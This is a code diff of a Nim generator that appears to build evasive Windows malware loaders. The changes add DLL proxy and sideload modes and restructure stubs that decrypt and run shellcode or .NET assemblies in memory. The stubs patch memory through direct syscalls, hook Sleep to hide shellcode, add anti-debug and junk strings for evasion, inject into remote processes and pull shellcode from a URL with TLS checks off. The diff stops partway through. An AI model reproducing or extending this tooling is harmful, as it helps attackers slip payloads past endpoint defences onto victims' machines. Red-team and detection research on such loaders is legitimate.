@@ -333,16 +333,19 @@ if args["--dllexportfunc"]:
 
 if args["--dllhijack"]:
   dllhijack = true
+  dll_out = true
 
 if args["--dllProxy"]:
   dllProxy = true
   dllhijack = true
+  dll_out = true
 
 if args["--noNimMain"]:
   noNimMain = true
 
 if args["--clone"]:
     dllclone = true
+    dll_out = true
     # NetClone will only work, when DllMain is exposed and leading to NimMain
     dllhijack = true
     let cloneDLL = args["--clone"]
@@ -350,6 +353,7 @@ if args["--clone"]:
 
 if args["--cpl"]:
   dllhijack = true
+  dll_out = true
   cpl = true
 
 
@@ -582,6 +586,11 @@ if (hellsgate and jump):
 if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
     echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
     quit(1)
+
+if (dllclone and dllProxy):
+    echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
+    quit(1)
+
 if (peload or peinject):
     let stream = newFileStream(filename, mode = fmRead)
     defer: stream.close()
@@ -717,88 +726,100 @@ proc getRandStub (): string =
   var randValues: string = rndStr(rand(50..500))
   let randstub = fmt"""
 
+    var {randName}: string = obf("{randValues}")
+
+
+"""
+  return randstub
+
+proc getRandStubNoTab (): string =
+  var randName: string = rndStr(rand(10..25))
+  var randValues: string = rndStr(rand(50..500))
+  let randstub = fmt"""
+
 var {randName}: string = obf("{randValues}")
+
 
 """
   return randstub
 
 let PatchargsFuncs = fmt"""
-var arguments: string = "{arguments}"
-when defined(args):
-    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
-        var oldProtect: DWORD = 0
-        var lpAddress = targetAddr
-        var dwSize = cast[SIZE_T](len(data))
-        var status: NTSTATUS = 0x00000000
-        when defined(DInvoke):
-            var hProcess = MyGetCurrentProcess()
-        else:
-            var hProcess = GetCurrentProcess()
-        when defined(Syswhispers):
-            status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-            when defined(verbose):
-                echo obf("NtProtectVirtualMemory: "),toHex(status)
-            if (status != 0):
+    var arguments: string = "{arguments}"
+    when defined(args):
+        proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+            var oldProtect: DWORD = 0
+            var lpAddress = targetAddr
+            var dwSize = cast[SIZE_T](len(data))
+            var status: NTSTATUS = 0x00000000
+            when defined(DInvoke):
+                var hProcess = MyGetCurrentProcess()
+            else:
+                var hProcess = GetCurrentProcess()
+            when defined(Syswhispers):
+                status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 when defined(verbose):
-                    echo obf("[-] Failed to change memory protections.")
-                when defined(verbose):
-                    echo toHex(status)
-        else:
-            when defined(HellsGate):
-                if getSyscall(ntProtectTable):                
-                    syscall = ntProtectTable.wSysCall
+                    echo obf("NtProtectVirtualMemory: "),toHex(status)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to change memory protections.")
+                    when defined(verbose):
+                        echo toHex(status)
+            else:
+                when defined(HellsGate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to change memory protections.")
+                        echo toHex(status)
+                
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-            status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-            if (status != 0):
-                when defined(verbose):
-                    echo obf("[-] Failed to change memory protections.")
-                    echo toHex(status)
-            
-        when defined(Hellsgate):
-            if getSyscall(ntWriteTable):
-                syscall = ntWriteTable.wSysCall
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var scLength: SIZE_T = SIZE_T(len(data))
+            var bytesWritten: SIZE_T
+                
+            when defined(Syswhispers):
+                status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
             else:
+                status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
                 when defined(verbose):
-                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-        var scLength: SIZE_T = SIZE_T(len(data))
-        var bytesWritten: SIZE_T
-            
-        when defined(Syswhispers):
-            status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-        else:
-            status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-            when defined(verbose):
-                echo obf("NtWriteVirtualMemory: "),toHex(status)
-            if (status != 0):
-                when defined(verbose):
-                    echo obf("[-] Failed to write arguments.")
-                when defined(verbose):
-                    echo toHex(status)
-            else:
-                when defined(verbose):
-                    echo obf("[+] Arguments written successfully.")
-        when defined(Syswhispers):
-            status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
-        else:
-            when defined(HellsGate):
-                if getSyscall(ntProtectTable):                
-                    syscall = ntProtectTable.wSysCall
+                    echo obf("NtWriteVirtualMemory: "),toHex(status)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to write arguments.")
+                    when defined(verbose):
+                        echo toHex(status)
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-            success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
-when defined(args):
-    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
-        when defined x86:
-            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
-        else:
-            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
-        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
-            shellcode.add t        
-        shellcode.add(byte(0xc3)) # ret
-        patchMemory(funcAddr, shellcode)
+                        echo obf("[+] Arguments written successfully.")
+            when defined(Syswhispers):
+                status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+            else:
+                when defined(HellsGate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+    when defined(args):
+        proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+            when defined x86:
+                var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+            else:
+                var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+            for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+                shellcode.add t        
+            shellcode.add(byte(0xc3)) # ret
+            patchMemory(funcAddr, shellcode)
 """
 
 
@@ -806,77 +827,70 @@ let RemoteProcImportStub = """
 import osproc
 """
 
-let AssemblyImports = """
-import winim/clr
-from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
-"""
 
 let LoadAssemblyStub = fmt"""
 
-# Actually decrypt after doing everything else for better evasion.
-ptrEncText = cast[ptr byte](addr enctext[0])
-ptrDecText = cast[ptr byte](addr dectext[0])
-decryptlate()
+    # Actually decrypt after doing everything else for better evasion.
+    ptrEncText = cast[ptr byte](addr enctext[0])
+    ptrDecText = cast[ptr byte](addr dectext[0])
+    decryptlate()
 
-var assembly = load(dectext)
+    var assembly = load(dectext)
 
-from os import paramCount,paramStr
 
-when defined(lib_only):
-    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
-    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-    AttachConsole(-1)
-
-when defined(Fluctuate):
-    g_fluctuationData.shellcodeAddr = dectext[0].addr
-    g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
-    # Will change the hardcoded key later on
-    when defined(amd64):
-        g_fluctuationData.encodeKey = 0x1337DE4D
-    when defined(i386):
-        g_fluctuationData.encodeKey = 0x1337
-    g_fluctuationData.currentlyEncrypted = false
-    g_fluctuationData.protect = PAGE_READWRITE
-    g_fluctuate = FluctuateToRW
-    if (hookSleep()):
-        when defined(verbose):
-            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
-    else:
-        when defined(verbose):
-            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
-
-var cmd: seq[string]
-var i = 1
-when defined(args):
-    cmd.add({arguments.split(" ")})
-while i <= paramCount():
     when defined(lib_only):
-        if (i != 1):
-            # first parameter is rundll32.exe,Funcname (skip that)
+        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+        AttachConsole(-1)
+
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = dectext[0].addr
+        g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            when defined(verbose):
+                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            when defined(verbose):
+                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+
+    var cmd: seq[string]
+    var i = 1
+    when defined(args):
+        cmd.add({arguments.split(" ")})
+    while i <= paramCount():
+        when defined(lib_only):
+            if (i != 1):
+                # first parameter is rundll32.exe,Funcname (skip that)
+                cmd.add(paramStr(i))
+        else:
             cmd.add(paramStr(i))
-    else:
-        cmd.add(paramStr(i))
-    inc(i)
+        inc(i)
 """
 
 let LoadAssemblyStubArgs = """
-var arr = toCLRVariant(cmd, VT_BSTR)
-assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    var arr = toCLRVariant(cmd, VT_BSTR)
+    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+
+when not defined(lib_only):
+    discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
-var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
-assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
+    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+
+when not defined(lib_only):
+    discard main(nil)
 """
 
-let WinLeanGetCurrentProcStub = """
-from winlean import getCurrentProcess
-
-"""
-
-let Winimleanstub = """
-import winim/lean
-"""
 
 let SleepStubSecond * = fmt"""
 when defined(verbose):
@@ -896,21 +910,21 @@ when isMainModule:
 """
 
 let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
-var remoteprocesses: seq[string] = {remoteprocesses}
+    var remoteprocesses: seq[string] = {remoteprocesses}
 """
 
 let ShellcodeFromFileStub * = fmt"""
 
-var fileHandle: File
-var encString: string
-for f in {shellcodeFile}:
-    try:
-        fileHandle = open(f, fmRead)
-        encString = fileHandle.readAll()
-        break
-    except:
-        when defined(verbose):
-            echo obf("[-] Failed to open file: ") & f
+    var fileHandle: File
+    var encString: string
+    for f in {shellcodeFile}:
+        try:
+            fileHandle = open(f, fmRead)
+            encString = fileHandle.readAll()
+            break
+        except:
+            when defined(verbose):
+                echo obf("[-] Failed to open file: ") & f
 
 """
 
@@ -918,16 +932,16 @@ let ShellcodeFromURLStub * = fmt"""
 
 import std/net
 import std/httpclient
-when defined(ssl):
-    var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
-else:
-    var client = newHttpClient()
-var encString = client.getContent("{shellcodeURL}")
+    when defined(ssl):
+        var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
+    else:
+        var client = newHttpClient()
+    var encString = client.getContent("{shellcodeURL}")
 
 """
 
 let ShellcodeDefaultStub * = fmt"""
-const encstring = slurp"enc.blob"
+    const encstring = slurp"enc.blob"
 
 """
 
@@ -940,15 +954,33 @@ import winim/lean
 #import winim/winstr
 #import winim/utils
 #from winim import winstr,winimbase,windef
+
+# when defined C#
+import winim/clr
+from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
+from os import paramCount,paramStr
+
+# when defined Hellsgate
+from os import paramStr
+{.passC:"-masm=intel".}
+from winlean import getCurrentProcess
+
+# add When defined remoteinject
+from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA
+# when defined remoteinject or COMVARETW
+import osproc,os
+from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+
+
 import strformat
 from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import strutils
 import ptr_math
-import strenc
+when not defined(proxy):
+    import strenc
 when defined(Fluctuate):
     import Fluctuation
-
-var success: BOOL
 
 proc toString(bytes: openarray[byte]): string =
   result = newString(bytes.len)
@@ -985,162 +1017,162 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var dctx: ECB[aes256]
+
 
 """
 
 let Cryptstub2 = fmt"""
+    var dctx: ECB[aes256]
+    var success: BOOL
+    when defined(sleepinbetween):
+        var sleepbetweentime: int = {sleepinbetween}
 
-when defined(sleepinbetween):
-    var sleepbetweentime: int = {sleepinbetween}
-
-var enctext: seq[byte] = toByteSeq(encstring)
-var key: array[aes256.sizeKey, byte]
-var envkey: string = obf("{envkey}")
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var key: array[aes256.sizeKey, byte]
+    var envkey: string = obf("{envkey}")
 """
 
 let Cryptstub3 = fmt"""
     
-var expandedkey = toByteSeq(envkey)
-if ((len(expandedkey) mod aes256.sizeBlock) != 0):
-    when defined(verbose):
-        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
-        echo "[*] Length: " & $len(expandedkey)
-        echo "[*] Padding Key with null bytes"
-    expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
-    when defined(verbose):
-        echo "[*] New Length: " & $len(expandedkey)
+    var expandedkey = toByteSeq(envkey)
+    if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+        when defined(verbose):
+            echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+            echo "[*] Length: " & $len(expandedkey)
+            echo "[*] Padding Key with null bytes"
+        expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+        when defined(verbose):
+            echo "[*] New Length: " & $len(expandedkey)
 
-copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
-var dectext = newSeq[byte](len(enctext))
+    copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
+    var dectext = newSeq[byte](len(enctext))
 
-var ptrKey = cast[ptr byte](addr key[0])
-var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
-var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
-let dataLen = uint(len(enctext))
+    var ptrKey = cast[ptr byte](addr key[0])
+    var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
+    var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
+    let dataLen = uint(len(enctext))
 
-# Decrypt
-#dctx.init(ptrKey)
-#dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-#dctx.clear()
+    # Decrypt
+    #dctx.init(ptrKey)
+    #dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+    #dctx.clear()
 
-proc decryptLate(): void =
-    when defined(verbose):
-        echo obf("[!] Decrypting Shellcode for execution in memory")
-    dctx.init(ptrKey)
-    dctx.decrypt(ptrEncText, ptrDecText, dataLen)
-    dctx.clear()
+    proc decryptLate(): void =
+        when defined(verbose):
+            echo obf("[!] Decrypting Shellcode for execution in memory")
+        dctx.init(ptrKey)
+        dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+        dctx.clear()
 
 """
 
 let RemoteModuleHandleStub = """
 
-# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
+    # Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
 
-from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
 
-proc ConvertToString(CharArr :array[256,char]): string =
-    var index = 0
-    while CharArr[index] != '\x00':
-        result.add(CharArr[index])
-        index += 1
+    proc ConvertToString(CharArr :array[256,char]): string =
+        var index = 0
+        while CharArr[index] != '\x00':
+            result.add(CharArr[index])
+            index += 1
 
-proc GetRemoteModuleHandle * (hProcess:HANDLE, ModuleName: string): HMODULE =
-    var 
-        modEntry : MODULEENTRY32A
-        snapshot : HANDLE
+    proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
+        var 
+            modEntry : MODULEENTRY32A
+            snapshot : HANDLE
 
-    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
-    if snapshot != INVALID_HANDLE_VALUE:
-        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
-        if Module32FirstA(snapshot, addr modEntry):
-            while Module32NextA(snapshot, addr modEntry):
-                if ConvertToString(modEntry.szModule) == ModuleName:
-                    return modEntry.hModule
-    CloseHandle(snapshot)
-    return 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
+        if snapshot != INVALID_HANDLE_VALUE:
+            modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
+            if Module32FirstA(snapshot, addr modEntry):
+                while Module32NextA(snapshot, addr modEntry):
+                    if ConvertToString(modEntry.szModule) == ModuleName:
+                        return modEntry.hModule
+        CloseHandle(snapshot)
+        return 0
 
-proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
-    var
-        baseModule : UINT_PTR = cast[UINT64](hModule)
-        dosHeader : IMAGE_DOS_HEADER
-        ntHeader : IMAGE_NT_HEADERS
-        exportDirectory : IMAGE_EXPORT_DIRECTORY
-        ExportTable : DWORD = 0
-        ExportFunctionTableVA : UINT_PTR = 0
-        ExportNameTableVA : UINT_PTR = 0
-        ExportOrdinalTableVA : UINT_PTR = 0
-        ExportNameTable: seq[DWORD]
-        ExportFunctionTable: seq[DWORD]
-        ExportOrdinalsTable: seq[WORD] 
-        MinFunNumber : UINT_PTR = 0
-        Func : DWORD = 0
-        Ord : WORD = 0
-        CharIndex : UINT_PTR = 0
-        TempChar : char
-        Done : bool = false
-        TempFunctionName : string = ""
+    proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
+        var
+            baseModule : UINT_PTR = cast[UINT64](hModule)
+            dosHeader : IMAGE_DOS_HEADER
+            ntHeader : IMAGE_NT_HEADERS
+            exportDirectory : IMAGE_EXPORT_DIRECTORY
+            ExportTable : DWORD = 0
+            ExportFunctionTableVA : UINT_PTR = 0
+            ExportNameTableVA : UINT_PTR = 0
+            ExportOrdinalTableVA : UINT_PTR = 0
+            ExportNameTable: seq[DWORD]
+            ExportFunctionTable: seq[DWORD]
+            ExportOrdinalsTable: seq[WORD] 
+            MinFunNumber : UINT_PTR = 0
+            Func : DWORD = 0
+            Ord : WORD = 0
+            CharIndex : UINT_PTR = 0
+            TempChar : char
+            Done : bool = false
+            TempFunctionName : string = ""
 
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
-        return NULL
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read and check the NT signature: "), GetlastError()
-        return NULL
-
-    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
-    
-    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
-        when defined(verbose):
-            echo obf("Failed to Read the main export table "), GetlastError()
-
-    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
-    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
-    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-        Func = 0
-        Ord = 0 
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy name table "), GetlastError()
+                echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
             return NULL
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy Ordinal table "), GetlastError()
+                echo obf("Failed to Read and check the NT signature: "), GetlastError()
             return NULL
-        ExportNameTable.add(Func)
-        ExportOrdinalsTable.add(Ord)
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
-        Func = 0
-        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+
+        ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
+        
+        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
             when defined(verbose):
-                echo obf("Failed to copy fucntion table "), GetlastError()
-            return NULL
-        ExportFunctionTable.add(Func)
-    
-    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-        CharIndex = 0
-        Done = false
-        TempFunctionName = ""
-        while Done == false:
-            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                echo obf("Failed to Read the main export table "), GetlastError()
+
+        ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
+        ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
+        ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+            Func = 0
+            Ord = 0 
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
                 when defined(verbose):
-                    echo obf("Failed to read the names of the functions"), GetlastError()
+                    echo obf("Failed to copy name table "), GetlastError()
                 return NULL
-            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
-                Done = true
-            else:
-                TempFunctionName.add(TempChar)
-            CharIndex += 1
-        if TempFunctionName == FuncName:
-            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
-    when defined(verbose):
-        echo obf("[X] Proc name does not exits")
-    return NULL
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+                when defined(verbose):
+                    echo obf("Failed to copy Ordinal table "), GetlastError()
+                return NULL
+            ExportNameTable.add(Func)
+            ExportOrdinalsTable.add(Ord)
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
+            Func = 0
+            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+                when defined(verbose):
+                    echo obf("Failed to copy fucntion table "), GetlastError()
+                return NULL
+            ExportFunctionTable.add(Func)
+        
+        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+            CharIndex = 0
+            Done = false
+            TempFunctionName = ""
+            while Done == false:
+                if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                    when defined(verbose):
+                        echo obf("Failed to read the names of the functions"), GetlastError()
+                    return NULL
+                if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
+                    Done = true
+                else:
+                    TempFunctionName.add(TempChar)
+                CharIndex += 1
+            if TempFunctionName == FuncName:
+                return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
+        when defined(verbose):
+            echo obf("[X] Proc name does not exits")
+        return NULL
 
 """
 
@@ -1171,7 +1203,7 @@ proc genEnglishwords (nuofWords: int): string =
 
   let englishwordsstub = fmt"""
 
-var {rand2} = {rand1}
+    var {rand2} = {rand1}
 
 """
   return englishwordsstub
@@ -1199,7 +1231,7 @@ proc genTrustedwords (nuofWords: int): string =
 
   let trustedwordsstub = fmt"""
 
-var {rand2} = {rand1}
+    var {rand2} = {rand1}
 
 """
 
@@ -1207,10 +1239,10 @@ var {rand2} = {rand1}
 
 let DLLNoHideStub = """
 
-when defined(lib_only):
-    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
-    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-    AttachConsole(-1)
+    when defined(lib_only):
+        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+        AttachConsole(-1)
 
 """
 
@@ -1242,6 +1274,25 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
     NimMain()
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
+  #if fdwReason == DLL_PROCESS_ATTACH:
+  #  NimMain()
+  return true
+
+"""
+
+let DLLProxyStub = """
+
+import dynlib
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+  
+  if fdwReason == DLL_PROCESS_ATTACH:
+    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+    CloseHandle(threadHandle)
+  #if fdwReason == DLL_THREAD_ATTACH:
+  #  NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
   #  NimMain()
   return true
@@ -1293,9 +1344,7 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-import os
 
-from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
 
 proc FindPidByName * (processName : string):DWORD =
     try:
@@ -1384,7 +1433,7 @@ proc StartProcess(): void =
 
     status = CreateProcess(
         NULL,
-        tProcPath,
+        cast[LPWSTR](tProcPath),
         ps,
         ts, 
         FALSE,
@@ -1412,7 +1461,11 @@ when defined(verbose):
 
 
 """
+let MainStub * = """
 
+proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
+
+"""
 
 let BeingDebugged * = fmt"""
 import AntiDebug
@@ -1444,7 +1497,7 @@ if(pump):
 if(antidebug):
     stub.add(BeingDebugged)
 
-stub.add(getRandStub())
+stub.add(getRandStubNoTab())
 
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
@@ -1469,7 +1522,7 @@ if(gosleep):
     stub.add(SleepStubFirst)
     stub.add(SleepStubSecond)
 
-stub.add(getRandStub())
+stub.add(getRandStubNoTab())
 
 if (getfreshstub):
     stub.add(GetSyscallStub)
@@ -1487,36 +1540,40 @@ if (syswhispers):
         else:
             stub.add(WhispersStubX86)
 
+if(hellsgate):
+    stub.add(HellsgateStub)
+    stub.add(HellsgateAllocDelegate)
+    stub.add(HellsgateProtectDelegate)
+    stub.add(HellsgateWriteDelegate)
+    stub.add(HellsgateNtCloseDelegate)
+    if (peload and (not localinject)):
+        stub.add(HellsgateNtCreateThreadExDelegate)
+    elif(localCreateThread):
+        stub.add(HellsgateNtCreateThreadExDelegate)
+    elif(not localinject):
